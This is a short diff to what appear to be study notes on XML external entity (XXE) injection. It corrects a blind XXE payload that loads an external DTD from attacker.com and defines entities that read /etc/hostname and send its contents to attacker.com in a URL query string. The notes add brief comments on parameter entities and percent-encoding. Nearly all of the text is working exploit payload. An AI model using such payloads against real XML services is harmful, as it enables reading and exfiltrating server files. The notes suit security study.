@@ -92,7 +92,8 @@ we can't reference a parameter entity within another entity in the doctype subse
 
 use external ddt:
 <!DOCTYPE data [
-<!entity % xxe SYSTEM "http://attacker.com/evil.dtd">
+// <!ENTITY xxe SYSTEM "https://attacker.com"> // general entity blocked use
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> // parameter entity
 %xxe;
 ]>
 
@@ -100,8 +101,9 @@ use external ddt:
   <prodId>123</prodId>
 </data>
 
+// blind XXE
 evil.dtd:
-<ENTITY % file SYSTEM "file:///etc/hostname">
-<ENTITY % stack "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % stack "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>"> // &#x25; is encoded to not have more than 1 % and cause issues
 %stack;
 %exfiltrate;
